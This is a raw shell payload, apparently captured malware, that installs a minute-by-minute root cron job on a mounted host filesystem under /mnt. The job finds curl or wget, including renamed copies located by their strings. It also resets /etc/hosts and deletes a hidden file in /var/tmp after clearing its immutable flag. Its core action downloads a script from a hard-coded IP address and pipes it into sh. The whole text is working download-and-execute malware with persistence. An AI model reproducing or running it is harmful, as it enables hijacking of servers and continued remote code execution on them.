/bin/sh -c '
C="*/1 * * * *
RH=\"http://18.139.187.97\";
BP=\$(dirname \"\$(command -v yes)\");
BP=\${BP:-\"/usr/bin\"};
Curl=\"curl\";

if [ \$(curl --version 2>/dev/null|grep \"curl \"|wc -l) -eq 0 ];
  then Curl=\"echo\";
    for f in \${BP}/*;
      do strings \$f 2>/dev/null|grep -q \"CURLOPT_VERBOSE\" && Curl=\"\$f\" && break;
    done;
  fi;
  Wget=\"wget\";
  if [ \$(wget --version 2>/dev/null|grep \"wgetrc \"|wc -l) -eq 0 ];
    then
      Wget=\"echo\";
      for f in \${BP}/*;do strings \$f 2>/dev/null|grep -q \"to <bug-wget@gnu.org>\" && Wget=\"$f\" && break;

    done;
  fi;

  if [ $(cat /etc/hosts|grep -i \"191666.xyz\"|wc -l) -ne 0 ];
    then
      echo \"127.0.0.1 localhost\" > /etc/hosts >/dev/null 2>&1;
    fi;
    chattr -ia /var/tmp/.config-err 2>/dev/null;
    rm -f /var/tmp/.config-err;(\$Curl -fs \${RH}/lib_tmp||\$Wget -qO- \${RH}/lib_tmp)|sh 2>/dev/null";
    chattr -ia /mnt/var/spool/cron/root;echo "${C}" >/mnt/var/spool/cron/root;chattr -ia /mnt/etc/cron.d/root;
    echo "${C}" >/mnt/etc/cron.d/root;chattr -ia /mnt/var/spool/crontabs/root;
    echo "${C}" >/mnt/var/spool/crontabs/root;chattr -ia /mnt/etc/crontabs;
    echo "${C}" >/mnt/etc/crontabs;exit
